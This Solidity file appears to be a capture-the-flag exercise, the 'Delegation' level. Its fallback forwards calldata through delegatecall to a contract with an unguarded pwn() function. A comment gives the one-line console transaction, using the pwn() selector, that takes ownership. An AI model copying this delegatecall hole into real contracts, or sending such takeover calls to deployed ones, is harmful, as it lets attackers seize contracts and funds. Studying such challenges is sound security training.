// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

/// @dev The goal is to become the owner of the contract, this is really simple, in the console you 
/// can directly do "await contract.sendTransaction({data: "0xdd365b8b"})" that will trigger the fallback
/// fct and the encoded data is the firsts 4 bytes of keccak256("pwn()") to trigger the function.
contract Delegation {

    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}